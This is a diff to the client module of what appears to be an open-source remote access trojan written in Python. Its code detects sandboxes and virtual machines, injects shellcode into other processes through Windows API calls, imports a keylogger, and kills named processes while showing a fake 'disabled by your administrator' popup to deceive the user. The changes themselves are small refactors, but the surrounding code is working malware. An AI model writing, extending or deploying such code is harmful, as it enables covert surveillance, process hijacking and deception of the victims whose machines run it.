@@ -12,6 +12,7 @@ import subprocess
 import sys
 import threading
 import platform
+import time
 from io import BytesIO, StringIO
 
 import pyscreeze
@@ -24,7 +25,7 @@ from src.command_defs import *
 from src.client.keylogger import Keylogger
 
 
-def message_box(message, title="Message", values=0x40000):
+def message_box(message, title, values):
     threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, values)).start()
 
 
@@ -35,11 +36,8 @@ def lock():
 def get_info():
     _hostname = socket.gethostname()
     _platform = f"{platform.system()} {platform.release()}"
-
-    if persistence.detect_sandboxie():
-        _platform += " (Sandboxie) "
-    if persistence.detect_vm():
-        _platform += " (Virtual Machine) "
+    _platform += " (Sandboxie) " if persistence.detect_sandboxie() else ""
+    _platform += " (Virtual Machine) " if persistence.detect_vm() else ""
 
     info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
             "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
@@ -68,7 +66,7 @@ class Control:
             h_process = ctypes.windll.kernel32.OpenProcess(0x001F0FFF, False, int(pid))
 
             if not h_process:
-                raise Exception(f"Could not aquire pid on {pid}")
+                raise Exception(f"Could not acquire pid on {pid}")
 
             ctypes.windll.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
             ctypes.windll.kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
@@ -87,12 +85,15 @@ class Control:
             ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ptr, ctypes.c_int(0),
                                                 ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
 
+            # wait a few seconds to see if client crashes
+            time.sleep(3)
+
         except Exception as e:
             self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
         else:
             self.socket.send_json(SUCCESS)
 
-    def toggle_disable_process(self, process):
+    def toggle_disable_process(self, process, popup):
         process = process.lower()
 
         if process in self.disabled_processes.keys() and self.disabled_processes.get(process):
@@ -107,7 +108,7 @@ class Control:
         subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          stdin=subprocess.PIPE, shell=True)
 
-        def block_process(fake_error_message=True):
+        def block_process():
             pythoncom.CoInitialize()
 
             c = wmi.WMI(moniker="winmgmts:{impersonationLevel=impersonate}!//./root/cimv2")
@@ -124,7 +125,7 @@ class Control:
                 if process_wmi.Name.lower() == process:
                     process_wmi.Terminate()
 
-                    if fake_error_message:
+                    if popup:
                         message_box(f"{process} has been disabled by your administrator", title=process,
                                     values=0x0 | 0x10 | 0x40000)
 
